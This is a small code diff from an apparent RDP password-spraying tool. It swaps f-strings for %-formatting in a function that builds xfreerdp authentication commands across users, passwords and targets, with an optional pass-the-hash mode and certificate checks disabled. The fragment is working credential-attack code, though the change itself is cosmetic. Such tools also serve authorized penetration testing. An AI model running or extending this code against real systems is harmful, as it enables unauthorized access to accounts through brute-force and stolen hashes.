@@ -198,19 +198,19 @@ def attempts(users, passes, targets, domain, output_file_name, hostnames_strippe
                         
                         command = [
                             "xfreerdp",
-                            f"/v:{target}",
-                            f"+auth-only",
-                            f"/d:{domain}",
-                            f"/u:{username}",
+                            "/v:%s" % target,
+                            "+auth-only",
+                            "/d:%s" % domain,
+                            "/u:%s" % username,
                             "/sec:nla",
                             "/cert-ignore"
                         ]
 
                         if pass_the_hash:
                             command.append("/p:") # /p is needed for +auth-only, even with /pth
-                            command.append(f"/pth:{password}")
+                            command.append("/pth:%s" % password)
                         else:
-                            command.append(f"/p:{password}")
+                            command.append("/p:%s" % password)
 
                         spray = subprocess.Popen(command, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
